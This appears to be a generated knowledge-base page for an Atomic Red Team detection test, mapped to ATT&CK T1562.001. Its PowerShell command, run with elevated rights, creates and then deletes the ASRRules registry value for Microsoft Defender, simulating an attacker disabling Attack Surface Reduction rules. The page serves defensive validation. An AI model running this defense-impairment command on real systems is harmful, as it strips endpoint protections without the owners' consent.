---
atomic_guid: "eea0a6c2-84e9-4e8c-a242-ac585d28d0d1"
title: "Delete Microsoft Defender ASR Rules - InTune"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "eea0a6c2-84e9-4e8c-a242-ac585d28d0d1"
  - "Delete Microsoft Defender ASR Rules - InTune"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Delete Microsoft Defender ASR Rules - InTune

This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates an InTune-based rules deployment.

## Metadata

- Atomic GUID: eea0a6c2-84e9-4e8c-a242-ac585d28d0d1
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager"

if (-not (Test-Path $registryPath)) {
  New-Item -Path $registryPath -Force
  Write-Host "Registry key created: $registryPath"
}

$registryValueName = "ASRRules"

if (Test-Path "$registryPath\$registryValueName") {
  Remove-ItemProperty -Path $registryPath -Name $registryValueName
  Write-Host "Registry value deleted: $registryValueName"
} else {
  New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value "36190899-1602-49e8-8b27-eb1d0a1ce869=1" -Force
  Write-Host "Registry value created: $registryValueName"
}


Remove-ItemProperty -Path $registryPath -Name $registryValueName
Write-Host "Registry value deleted: $registryValueName"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
